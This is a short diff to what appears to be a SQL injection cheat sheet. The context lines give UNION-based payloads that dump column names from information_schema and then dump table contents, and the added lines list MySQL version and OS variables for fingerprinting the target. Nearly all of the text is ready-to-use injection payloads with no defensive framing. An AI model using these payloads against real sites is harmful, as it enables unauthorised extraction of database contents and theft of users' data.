@@ -30,3 +30,8 @@ Step 2  ==================== enumration ==================================
                   column Dump            union all select 1,2,group_concat(column_name),4,5 from information_schema.columns where table_name='<Table Name>'
   
                   data Dump              union all select 1,2,group_concat(<column list>),4,5 from <table name>
+
+
+additionals 
+
+@@version_compile_os, @@version_compile_machine
